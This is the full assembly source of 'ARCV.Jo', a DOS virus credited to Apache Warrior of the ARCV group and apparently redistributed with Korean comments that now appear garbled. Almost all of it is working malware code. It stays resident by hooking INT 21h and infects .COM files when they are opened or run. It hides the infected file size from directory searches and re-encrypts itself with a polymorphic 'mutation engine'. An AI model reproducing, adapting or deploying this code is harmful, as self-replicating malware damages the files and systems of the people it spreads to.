;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                       ARCV.Jo                               CVC #01   97/06
;                       -------
;
; ���q : ARCV.Jo
; �A�b�a : Apache Warrior, �w��
; ���� : Osiris of CVC,Corea 97/06
; ���A : Resident .COM Encryption  Stealth
;
; This is Yet another virus from the ARCV, this one is called
; Joanna, it was written by Apache Warrior, ARCV President.
;
; It has Stealth features, it is a Resident infector of .COM files
; and uses the Cybertech Mutation Engine (TM) by Apache Warrior for 
; its Polymorphic features.  There is a maximum of 3 unchanged bytes
; in the Encrypted code.
;
; ���� �w���� �a����a �a���� ARCV �A�� �A�b�e �a����a���a.
; ARCV �� �Q��e ���w���A �w�� �w�i�A �A͡ �A���a.
;
; �a�i�� �a����a�e �a���A ���a�� �g�a�� �e�a.
;
; �a�ᶅ�� á�w�ⷥ �A�� (Int 24h) �i �១ �a�� �g�e �����a.
;
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
.model tiny

code segment

                ASSUME CS:CODE,DS:CODE,ES:CODE

int_21ofs       equ 84h                         ;
int_21seg       equ 86h                         ;
length          equ offset handle-offset main   ; ����
msglen          equ offset oldstart-offset msg  ; �A���� ����
tsrlen          equ (offset findat-offset main)/10 ; ���w�� �a��
len             equ offset handle-offset main   ;
virlen          equ (offset string-offset main2)/2
decryptlen      equ offset main2-offset main    ; �qѡ����

                org 100h  

start:          jmp main
                db 0,0,0

main:           mov si,offset main2             ; �qѡЁ�A�i ���e SI �t
                mov cx,virlen                   ; �qѡ���E �a��
loop_1:         
                db 2eh,81h,2ch                  ; �qѡΉ��
switch:         dw 0
                add si,02h
                dec cx
                jnz loop_1

;
main2:          call findoff                    ; �I�a���a�U���a��
findoff:        pop si                          ; 
                sub si,offset findoff           ;
                push ds
                push es
                push cs                         ; cs=ds
                pop ds
                push cs                         ; cs=es
                pop es
                mov ax,0ff05h                   ; Scythe2 Boot ��a
                int 13h
                cmp ah,0e9h                     ;
                jnz haha                        ;
                mov ah,09h                      ; �����a�e �A���� �b
                lea dx,[si+offset msg2]         ; �a�� ���a�Q ����
                int 21h                         ;
                jmp $                           ; (���e ���a)

haha:           mov ah,2ah                      ; ���a�Q �i�a ���a��
                int 21h                         ;
                cmp dx,1210h                    ; 10 ���i���a ?
                jnz main3                       ;
                mov ah,09h                      ; �A���� �b
                lea dx,[si+offset msg] 
                int 21h

main3:          mov di,0100h                    ; ���� �a���a���� �|���� ����
                push si                         ; 5 �a���a
                mov ax,offset oldstart          ;
                add si,ax                       ;
                mov cx,05h                      ;
                cld                             ;
                repz movsb                      ;

inst:           mov ax,0ffa4h                   ; ���� ����w���A �w��Ё ���e�a ?
                int 21h
                pop si                          ; SI
                cmp ax,42a1h
                je oldprog                      ; ���� �w��Ё ���a�e ����З

tt2:            xor ax,ax                       ; �� �w�� ��˥
                push ax
                mov ax,ds                       ; MBC �A�a���a ���� �苡
                dec ax                          ; PSP - 1 = MCB
                mov es,ax                       ; ES = MCB ����
                pop ds                          ; 
                mov ax,word ptr ds:int_21ofs    ; Int 21h �����t �苡
                mov cx,word ptr ds:int_21seg    ;
                mov word ptr cs:[si+int21],ax   ; Int 21h �����t ��w
                mov word ptr cs:[si+int21+2],cx ;
                cmp byte ptr es:[0],5ah         ; ���b�A�e MCB ���a ?
                jne oldprog                     ; ���w�� ���a�w�A��e �b���e�q
                mov ax,es:[3]                   ;
                sub ax,0bch                     ; 3008 �a���a���a �b�e�a ?
                jb  oldprog                     ;
                mov es:[3],ax                   ;
                sub word ptr es:[12h],0bch      ;
                mov es,es:[12h]                 ;
                push ds                         ;
                push cs                         ;
                pop ds                          ; �a����a ���a
                mov di,0100h                    ;
                mov cx,len+5                    ;
                push si                         ;
                add si,0100h                    ;
                rep movsb                       ;
                pop si
                pop ds
                cli                             ;
                mov ax,offset new21             ; Int 21h �a����
                mov word ptr ds:int_21ofs,ax    ;
                mov word ptr ds:int_21seg,es    ;
                sti                             ;

oldprog:        
                mov di,0100h                    ; ���a COM �� �|���� ����
                pop es                          ;
                pop ds                          ;
                push di                         ;
                ret                             ;

int21           dd 0h                           ; Int 21h �� �����t

;
;   New interupt 21h Handler
;

sayitis:        mov ax,42a1h                    ; ����w���A �w��Ё���a
                iret 

new21:          ;nop                            ; Sign byte 
                cmp ax,0ffa4h                   ; ���w�� ��a ?
                je sayitis
                cmp ah,11h                      ; FCB Search file
                je adjust_FCB
                cmp ah,12h                      ; FCB Search Again
                je adjust_FCB
                cmp ah,4eh                      ; Handle Search file
                je adjust_FCB    
                cmp ah,4fh                      ; Handle Search Again
                je adjust_FCB
                cmp ah,3dh                      ; �a�� ���e
                je intgo                        ;
                cmp ah,4bh                      ; �a�� ��З
                jne noint 
intgo:          push ax                         ; 4bh, 3dh Infect file
                push bx                         ; �A���a��i ��w
                push cx
                push es
                push si
                push di
                push dx
                push ds
                call checkit                    ; �q�q ��˥ ѡ
                pop ds
                pop dx
                pop di
                pop si
                pop es
                pop cx
                pop bx
                pop ax
noint:          jmp cs:[int21]                  ; ������ Int 21h ��

adjust_FCB:     push es                         ; �a�I�a ��˥
                push bx
                push si
                push ax
                xor si,si
                and ah,40h                      ; 4Eh,4Fh �x�� ���a ?
                jz okFCB
                mov si,1                        ; Set flag
okFCB:          mov ah,2fh                      ; DTA ���� �苡
                int 21h 
                pop ax                          ; ���a ���e (11h,12h,4Eh,4Fh)
                call i21                        ; ��З
                pushf                           ; flag ��w
                push ax                         ; AX �A�� š�a ��w
                call adjust                     ; �a�I�a ��˥ ѡ
                pop ax                          ; �A���a�� ����
                popf
                pop si
                pop bx
                pop es
                retf 2                          ; ����

adjust:         pushf                           ; �a�I�a ��˥ �A�a
                cmp si,0                        ; 11h,12h ���a ?
                je fcb1
                popf
                jc repurn                       ; �A�ᷥ�a ?
                mov ah,byte ptr es:[bx+16h]     ;
                and ah,01ah                     ; �q�q �A���a ?
                cmp ah,01ah                     ;
                jne repurn                      ; 
                sub word ptr es:[bx+1ah],len    ; �a�� ���� - �a����a ����
; COM �a������ �����A 64 KB �i �� �g�a�a�� SBB �i �a�� �g�v�a.
; EXE �a���� �w�� SBB �i �a�wЁ�� �e�a.
repurn:         ret                             ; from file size.

fcb1:           popf                            ; FCB �i ���e ��˥
                cmp al,0ffh                     ; �A�� ?
                je meat_hook   
                cmp byte ptr es:[bx],0ffh       ; �¸w FCB ���a ?
                jne xx2
                add bx,7                        ; + 7
xx2:            mov ah,byte ptr es:[bx+17h]     ; �q�q �a�� ��a
                and ah,01ah
                cmp ah,01ah
                jne meat_hook
                sub word ptr es:[bx+1dh],len    ;
meat_hook:      ret  

com_txt db 'COM',0                              ; �¸w�a

reset:                                          ; �a�� ���� ��˥
                mov cx,20h                      ; �a���i ���� / �a����
set_back:                                       ; �a��
                mov al,01h
find_att:
                mov ah,43h                      ; �a�� ����
i21:            pushf
                call cs:[int21]
exitsub:        ret   

checkit:                                        ; Infect routine
                push es                         ; �� �g�e �A���a��i ��w
                push ds
                push ds                         ; �¸w�a�a COM ���� ��a
                pop es                          ;
                push dx                         ;
                pop di                          ;
                mov cx,0ffh                     ; . �x��
                mov al,'.'                      ;
                repnz scasb                     ;
                push cs                         ; cs=ds
                pop ds                          ;
                mov si,offset com_txt           ; COM ���a ?
                mov cx,3                        ;
                rep cmpsb                       ;
                pop ds                          ;
                pop es                          ;
                jnz exitsub                     ;

foundtype:      sub di,06h                      ; commaND.com ���� ��a
                cmp ds:[di],'DN'                ;
                je exitsub                      ;
                mov word ptr cs:[nameptr],dx    ; DS:DX ��w
                mov word ptr cs:[nameptr+2],ds  ;
                mov al,00h                      ; �a���� ���� �苡
                call find_att                   ;
                jc exitsub                      ; �A�� ?

alteratr:       mov cs:[attrib],cx              ; ���� ��w
                call reset                      ; ����/�a���� �a��

                mov ax,3d02h                    ; ���e
                call i21        
                jc exitsub                      ; �A�� ?
                push cs                         ;
                pop ds                          ; CS=DS
                mov ds:[handle],ax              ; �a�� Ѕ�i ��w

                mov ax,5700h                    ; �a���� �b����/���e �苡
                mov bx,ds:[handle]              ;
                call i21                        ;
ke9:            mov ds:[date],dx                ; �i�a ��w
                or cx,1ah                       ; �q�q �E ���a�� �១
                mov ds:[time],cx                ; ���e ��w
                                                  
                mov ah,3fh                      ; �|�� 5 �a���a ����
                mov cx,05h                      ;
                mov dx,offset oldstart          ;
                call i21                        ;
closeit:        jc close2                       ; �A�� ?

                mov ax,4202h                    ; �a�� �{�A�� -5 �a���a �A�e
                mov cx,0ffffh                   ; ��á�� ����
                mov dx,0fffbh                   ;
                call i21                        ;
                jc close                        ; �A�� ?

                mov word ptr cs:si_val,ax       ; �a�� �a���a ��w
                cmp ax,0ea60h                   ; EA60h ���a �e�a ?
                jae close                       ;

                mov ah,3fh                      ; 5 �a���a ����
                mov cx,05h                      ; 
                mov dx,offset tempmem           ; 
                call i21                        ; 
                jc close                        ;

                push cs                         ; cs=es
                pop es                          ;
                mov di,offset tempmem           ; �q�q �a�� �·�
                mov si,offset string            ;
                mov cx,5                        ;
                rep cmpsb                       ;
                jz close                        ;
                                                 
zapfile:                                        ;
                mov ax,word ptr cs:si_val       ; 
                add ax,2                        ;
                push cs                         ; 
                pop ds                          ; 
                mov word ptr ds:[jpover+1],ax   ; ������ ���a ��á ���
                call mut_eng                    ; Call Mutation Engine
                mov ah,40h                      ; �a��
                mov bx,cs:[handle]              ; Handle
                mov cx,length                   ; LENGTH OF PROGRAM****
                call i21                        ; �a�� ��З!
close2:         jc close                        ; Quit if error

                push cs                         ; Reset DS to CS
                pop ds                          ;      
                mov ax,4200h                    ; ͡����i ��q�a�� ����
                xor cx,cx                       ;
                cwd                             ; Clever way to XOR DX,DX
                call i21                        ;
                jc close                        ; Error Quit..
                                                 
                mov ah,40h                      ; Save new start 
                mov cx,03h                      ; 
                mov dx,offset jpover            ;
                call i21                        ;

close:          mov ax,5701h                    ; Time & Date ����
                mov bx,ds:[handle]              ;
                mov cx,ds:[time]                ;
                mov dx,ds:[date]                ;
                call i21                        ;
                mov ah,3eh                      ; �a�� �h��
                call i21                        ;
exit_sub:       mov dx,word ptr [nameptr]       ; ���� ����
                mov cx,ds:[attrib]              ;
                mov ds,word ptr cs:[nameptr+2]  ;
                call set_back                   ;
                ret                             ; Return to INT 21h Handler


;******************************************************************************
;               CyberTech Mutation Engine 
;
;               This is Version Two of the Mutation Engine 
;               Unlike others it is very much Virus Specific..  Works
;               Best on Resident Viruses..
;
;               To Call
;
;               si_val = File Size
;
;               Returns
;               DS:DX = Encrypted Virus Code, Use DS:DX pointer to
;                       Write From..
;
;******************************************************************************


mut_eng:
                mov ah,2ch                      ; Get Time
                call i21                        ;
                mov word ptr ds:[switch],dx     ; Use Sec./100th counter as key
                mov word ptr ds:[switch2+1],dx  ; Save to Decrypt and Encrypt
                mov ax,cs:[si_val]              ; �a�� �a�� �苡
                mov dx,offset main2             ;
                add ax,dx                       ;
                mov word ptr [main+1],ax        ; Decrypt offset ����
                xor byte ptr [loop_1+2],28h     ; Add/Sub �e��
                xor byte ptr switch2,28h        ;    "
                push cs                         ; CS=DS
                pop ds                          ;
                push cs                         ; CS=AX
                pop ax                          ;
                sub ax,0bch                     ;
                mov es,ax                       ; �a���� �A�a���a ���a��
                mov si,offset main              ; �qѡ��˥ ���a
                mov di,0100h                    ;
                mov cx,decryptlen               ;
                rep movsb                       ;
                mov si,offset main2             ; š�a �qѡ�� ���b
                mov cx,virlen                   ;
loop_10:        lodsw                           ;
switch2:        add ax,0000                     ; �qѡ��
                stosw                           ;
                loop loop_10                    ;
                mov si,offset string            ; �q�q ID ��w
                mov cx,5                        ;
                rep movsb                       ;
                mov dx,0100h                    ;
                push es                         ;
                pop ds                          ;
                ret                             ;

; Data Section, contains Messages etc.


;               Little message to the Wife to Be..

msg             db 'Looking Good Slimline Joanna.',0dh,0ah
                db 'Made in England by Apache Warrior, ARCV Pres.',0dh,0ah,0ah 
                db 'Jo Ver. 1.11 (c) Apache Warrior 92.',0dh,0ah
                db '$'

msg2            db 'I Love You Joanna, Apache..',0dh,0ah,'$'

virus_name      db '[JO]',00h                           ; Virus Name..
author          db 'By Apache Warrior, ARCV Pres.'      ; Thats me..
filler          dd 0h

oldstart:       mov ax,4c00h                    ; Orginal program start
                int 21h
                nop
                nop

j100h           dd 0100h                        ; Stores for jumps etc
jpover          db 0e9h,00,00h                  ;

string          db '65fd3'                      ; ID String 

heap:                                           ; This code is not saved
handle          dw 0h                           ; �a�� Ѕ�i
nameptr         dd 0h                           ;
attrib          dw 0h                           ; ����
date            dw 0h                           ; �i�a
time            dw 0h                           ; ���e
tempmem         db 10h dup (?)                  ;
findat          db 0h                           ;
si_val          dw 0h                           ;

code ends

end start
